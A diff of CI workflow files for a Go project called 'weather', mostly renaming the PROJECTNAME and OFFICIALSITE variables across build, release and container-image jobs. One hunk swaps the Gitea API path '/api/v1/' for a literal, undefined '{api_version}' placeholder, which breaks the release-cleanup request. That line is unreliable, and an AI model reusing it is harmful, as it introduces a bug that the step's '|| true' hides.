@@ -37098,15 +38741,15 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/agent
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/agent
 
       - name: Upload Agent artifact
         if: hashFiles('src/agent/') != ''
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
   release:
     needs: build
@@ -37158,7 +38801,7 @@ permissions:
   contents: write
 
 env:
-  PROJECTNAME: weather
+  PROJECT_NAME: weather
 
 jobs:
   build:
@@ -37198,12 +38841,12 @@ jobs:
           echo "VERSION=$(date -u +"%Y%m%d%H%M%S")" >> $GITHUB_ENV
           echo "COMMIT_ID=$(git rev-parse --short HEAD)" >> $GITHUB_ENV
           echo "BUILD_DATE=$(date +"%a %b %d, %Y at %H:%M:%S %Z")" >> $GITHUB_ENV
-          # OFFICIALSITE (optional): Set in repository secrets, or site.txt file, or leave empty
+          # OFFICIAL_SITE (optional): Set in repository secrets, or site.txt file, or leave empty
           # Never guess or assume - must be explicitly defined by user
           if [ -f site.txt ]; then
-            echo "OFFICIALSITE=$(cat site.txt)" >> $GITHUB_ENV
+            echo "OFFICIAL_SITE=$(cat site.txt)" >> $GITHUB_ENV
           else
-            echo "OFFICIALSITE=${{ secrets.OFFICIALSITE }}" >> $GITHUB_ENV
+            echo "OFFICIAL_SITE=${{ secrets.OFFICIAL_SITE }}" >> $GITHUB_ENV
           fi
 
       - name: Build server
@@ -37212,8 +38855,8 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src
 
       # CLI build - only if src/client/ directory exists
       - name: Build CLI
@@ -37223,21 +38866,21 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/client
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/client
 
       - name: Upload server artifact
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
       - name: Upload CLI artifact
         if: hashFiles('src/client/') != ''
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
       # Agent build - only if src/agent/ directory exists
       - name: Build Agent
@@ -37247,15 +38890,15 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/agent
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/agent
 
       - name: Upload Agent artifact
         if: hashFiles('src/agent/') != ''
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
   release:
     needs: build
@@ -37333,7 +38976,7 @@ on:
   workflow_dispatch:
 
 env:
-  PROJECTNAME: weather
+  PROJECT_NAME: weather
   REGISTRY: ghcr.io
   IMAGE_NAME: ${{ github.repository }}
 
@@ -37407,9 +39050,9 @@ jobs:
           labels: |
             org.opencontainers.image.vendor=apimgr
             org.opencontainers.image.authors=apimgr
-            org.opencontainers.image.title=${{ env.PROJECTNAME }}
-            org.opencontainers.image.base.name=${{ env.PROJECTNAME }}
-            org.opencontainers.image.description=${{ env.PROJECTNAME }} - standard image (alpine)
+            org.opencontainers.image.title=${{ env.PROJECT_NAME }}
+            org.opencontainers.image.base.name=${{ env.PROJECT_NAME }}
+            org.opencontainers.image.description=${{ env.PROJECT_NAME }} - standard image (alpine)
             org.opencontainers.image.version=${{ env.VERSION }}
             org.opencontainers.image.created=${{ env.BUILD_DATE }}
             org.opencontainers.image.revision=${{ env.COMMIT_ID }}
@@ -37420,9 +39063,9 @@ jobs:
           annotations: |
             manifest:org.opencontainers.image.vendor=apimgr
             manifest:org.opencontainers.image.authors=apimgr
-            manifest:org.opencontainers.image.title=${{ env.PROJECTNAME }}
-            manifest:org.opencontainers.image.base.name=${{ env.PROJECTNAME }}
-            manifest:org.opencontainers.image.description=${{ env.PROJECTNAME }} - standard image (alpine)
+            manifest:org.opencontainers.image.title=${{ env.PROJECT_NAME }}
+            manifest:org.opencontainers.image.base.name=${{ env.PROJECT_NAME }}
+            manifest:org.opencontainers.image.description=${{ env.PROJECT_NAME }} - standard image (alpine)
             manifest:org.opencontainers.image.version=${{ env.VERSION }}
             manifest:org.opencontainers.image.created=${{ env.BUILD_DATE }}
             manifest:org.opencontainers.image.revision=${{ env.COMMIT_ID }}
@@ -37502,8 +39145,8 @@ jobs:
           labels: |
             org.opencontainers.image.vendor=apimgr
             org.opencontainers.image.authors=apimgr
-            org.opencontainers.image.title=${{ env.PROJECTNAME }}-aio
-            org.opencontainers.image.description=${{ env.PROJECTNAME }} - all-in-one (debian + postgresql + valkey + tor)
+            org.opencontainers.image.title=${{ env.PROJECT_NAME }}-aio
+            org.opencontainers.image.description=${{ env.PROJECT_NAME }} - all-in-one (debian + postgresql + valkey + tor)
             org.opencontainers.image.version=${{ env.VERSION }}
             org.opencontainers.image.created=${{ env.BUILD_DATE }}
             org.opencontainers.image.revision=${{ env.COMMIT_ID }}
@@ -37514,8 +39157,8 @@ jobs:
           annotations: |
             manifest:org.opencontainers.image.vendor=apimgr
             manifest:org.opencontainers.image.authors=apimgr
-            manifest:org.opencontainers.image.title=${{ env.PROJECTNAME }}-aio
-            manifest:org.opencontainers.image.description=${{ env.PROJECTNAME }} - all-in-one (debian + postgresql + valkey + tor)
+            manifest:org.opencontainers.image.title=${{ env.PROJECT_NAME }}-aio
+            manifest:org.opencontainers.image.description=${{ env.PROJECT_NAME }} - all-in-one (debian + postgresql + valkey + tor)
             manifest:org.opencontainers.image.version=${{ env.VERSION }}
             manifest:org.opencontainers.image.created=${{ env.BUILD_DATE }}
             manifest:org.opencontainers.image.revision=${{ env.COMMIT_ID }}
@@ -37606,7 +39249,7 @@ permissions:
   contents: write
 
 env:
-  PROJECTNAME: weather
+  PROJECT_NAME: weather
 
 jobs:
   build:
@@ -37646,12 +39289,12 @@ jobs:
           echo "VERSION=${GITEA_REF_NAME#v}" >> $GITEA_ENV
           echo "COMMIT_ID=$(git rev-parse --short HEAD)" >> $GITEA_ENV
           echo "BUILD_DATE=$(date +"%a %b %d, %Y at %H:%M:%S %Z")" >> $GITEA_ENV
-          # OFFICIALSITE (optional): Set in repository secrets, or site.txt file, or leave empty
+          # OFFICIAL_SITE (optional): Set in repository secrets, or site.txt file, or leave empty
           # Never guess or assume - must be explicitly defined by user
           if [ -f site.txt ]; then
-            echo "OFFICIALSITE=$(cat site.txt)" >> $GITEA_ENV
+            echo "OFFICIAL_SITE=$(cat site.txt)" >> $GITEA_ENV
           else
-            echo "OFFICIALSITE=${{ secrets.OFFICIALSITE }}" >> $GITEA_ENV
+            echo "OFFICIAL_SITE=${{ secrets.OFFICIAL_SITE }}" >> $GITEA_ENV
           fi
 
       - name: Build server
@@ -37660,8 +39303,8 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src
 
       # CLI build - only if src/client/ directory exists
       - name: Build CLI
@@ -37671,21 +39314,21 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/client
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/client
 
       - name: Upload server artifact
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
       - name: Upload CLI artifact
         if: hashFiles('src/client/') != ''
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
       # Agent build - only if src/agent/ directory exists
       - name: Build Agent
@@ -37695,15 +39338,15 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/agent
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/agent
 
       - name: Upload Agent artifact
         if: hashFiles('src/agent/') != ''
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
   release:
     needs: build
@@ -37741,7 +39384,7 @@ jobs:
         run: |
           tar --exclude='.git' --exclude='.github' --exclude='.gitea' \
             --exclude='binaries' --exclude='releases' --exclude='*.tar.gz' \
-            -czf binaries/${{ env.PROJECTNAME }}-${{ env.VERSION }}-source.tar.gz .
+            -czf binaries/${{ env.PROJECT_NAME }}-${{ env.VERSION }}-source.tar.gz .
 
       - name: Create Release
         uses: softprops/action-gh-release@v2
@@ -37768,7 +39411,7 @@ permissions:
   contents: write
 
 env:
-  PROJECTNAME: weather
+  PROJECT_NAME: weather
 
 jobs:
   build:
@@ -37794,12 +39437,12 @@ jobs:
           echo "VERSION=$(date -u +"%Y%m%d%H%M%S")-beta" >> $GITEA_ENV
           echo "COMMIT_ID=$(git rev-parse --short HEAD)" >> $GITEA_ENV
           echo "BUILD_DATE=$(date +"%a %b %d, %Y at %H:%M:%S %Z")" >> $GITEA_ENV
-          # OFFICIALSITE (optional): Set in repository secrets, or site.txt file, or leave empty
+          # OFFICIAL_SITE (optional): Set in repository secrets, or site.txt file, or leave empty
           # Never guess or assume - must be explicitly defined by user
           if [ -f site.txt ]; then
-            echo "OFFICIALSITE=$(cat site.txt)" >> $GITEA_ENV
+            echo "OFFICIAL_SITE=$(cat site.txt)" >> $GITEA_ENV
           else
-            echo "OFFICIALSITE=${{ secrets.OFFICIALSITE }}" >> $GITEA_ENV
+            echo "OFFICIAL_SITE=${{ secrets.OFFICIAL_SITE }}" >> $GITEA_ENV
           fi
 
       - name: Build server
@@ -37808,8 +39451,8 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src
 
       # CLI build - only if src/client/ directory exists
       - name: Build CLI
@@ -37819,21 +39462,21 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/client
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/client
 
       - name: Upload server artifact
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
       - name: Upload CLI artifact
         if: hashFiles('src/client/') != ''
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
       # Agent build - only if src/agent/ directory exists
       - name: Build Agent
@@ -37843,15 +39486,15 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/agent
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/agent
 
       - name: Upload Agent artifact
         if: hashFiles('src/agent/') != ''
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
   release:
     needs: build
@@ -37903,7 +39546,7 @@ permissions:
   contents: write
 
 env:
-  PROJECTNAME: weather
+  PROJECT_NAME: weather
 
 jobs:
   build:
@@ -37943,12 +39586,12 @@ jobs:
           echo "VERSION=$(date -u +"%Y%m%d%H%M%S")" >> $GITEA_ENV
           echo "COMMIT_ID=$(git rev-parse --short HEAD)" >> $GITEA_ENV
           echo "BUILD_DATE=$(date +"%a %b %d, %Y at %H:%M:%S %Z")" >> $GITEA_ENV
-          # OFFICIALSITE (optional): Set in repository secrets, or site.txt file, or leave empty
+          # OFFICIAL_SITE (optional): Set in repository secrets, or site.txt file, or leave empty
           # Never guess or assume - must be explicitly defined by user
           if [ -f site.txt ]; then
-            echo "OFFICIALSITE=$(cat site.txt)" >> $GITEA_ENV
+            echo "OFFICIAL_SITE=$(cat site.txt)" >> $GITEA_ENV
           else
-            echo "OFFICIALSITE=${{ secrets.OFFICIALSITE }}" >> $GITEA_ENV
+            echo "OFFICIAL_SITE=${{ secrets.OFFICIAL_SITE }}" >> $GITEA_ENV
           fi
 
       - name: Build server
@@ -37957,8 +39600,8 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src
 
       # CLI build - only if src/client/ directory exists
       - name: Build CLI
@@ -37968,21 +39611,21 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/client
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/client
 
       - name: Upload server artifact
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
       - name: Upload CLI artifact
         if: hashFiles('src/client/') != ''
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
       # Agent build - only if src/agent/ directory exists
       - name: Build Agent
@@ -37992,15 +39635,15 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/agent
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/agent
 
       - name: Upload Agent artifact
         if: hashFiles('src/agent/') != ''
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
   release:
     needs: build
@@ -38028,7 +39671,7 @@ jobs:
           # Use Gitea API to delete previous daily release
           curl -X DELETE \
             -H "Authorization: token ${{ secrets.GITEA_TOKEN }}" \
-            "${{ gitea.server_url }}/api/v1/repos/${{ gitea.repository }}/releases/tags/daily" || true
+            "${{ gitea.server_url }}/api/{api_version}/repos/${{ gitea.repository }}/releases/tags/daily" || true
           git push origin :refs/tags/daily 2>/dev/null || true
 
       - name: Create Release
@@ -38057,7 +39700,7 @@ on:
   workflow_dispatch:
 
 env:
-  PROJECTNAME: weather
+  PROJECT_NAME: weather
   # Registry auto-detected from Gitea instance (works with self-hosted)
   # Format: {gitea-server}/owner/repo -> extracts server for registry
   IMAGE_NAME: ${{ gitea.repository }}
@@ -38146,9 +39789,9 @@ jobs:
           labels: |
             org.opencontainers.image.vendor=apimgr
             org.opencontainers.image.authors=apimgr
-            org.opencontainers.image.title=${{ env.PROJECTNAME }}
-            org.opencontainers.image.base.name=${{ env.PROJECTNAME }}
-            org.opencontainers.image.description=${{ env.PROJECTNAME }} - standard image (alpine)
+            org.opencontainers.image.title=${{ env.PROJECT_NAME }}
+            org.opencontainers.image.base.name=${{ env.PROJECT_NAME }}
+            org.opencontainers.image.description=${{ env.PROJECT_NAME }} - standard image (alpine)
             org.opencontainers.image.version=${{ env.VERSION }}
             org.opencontainers.image.created=${{ env.BUILD_DATE }}
             org.opencontainers.image.revision=${{ env.COMMIT_ID }}
@@ -38159,9 +39802,9 @@ jobs:
           annotations: |
             manifest:org.opencontainers.image.vendor=apimgr
             manifest:org.opencontainers.image.authors=apimgr
-            manifest:org.opencontainers.image.title=${{ env.PROJECTNAME }}
-            manifest:org.opencontainers.image.base.name=${{ env.PROJECTNAME }}
-            manifest:org.opencontainers.image.description=${{ env.PROJECTNAME }} - standard image (alpine)
+            manifest:org.opencontainers.image.title=${{ env.PROJECT_NAME }}
+            manifest:org.opencontainers.image.base.name=${{ env.PROJECT_NAME }}
+            manifest:org.opencontainers.image.description=${{ env.PROJECT_NAME }} - standard image (alpine)
             manifest:org.opencontainers.image.version=${{ env.VERSION }}
             manifest:org.opencontainers.image.created=${{ env.BUILD_DATE }}
             manifest:org.opencontainers.image.revision=${{ env.COMMIT_ID }}
@@ -38248,8 +39891,8 @@ jobs:
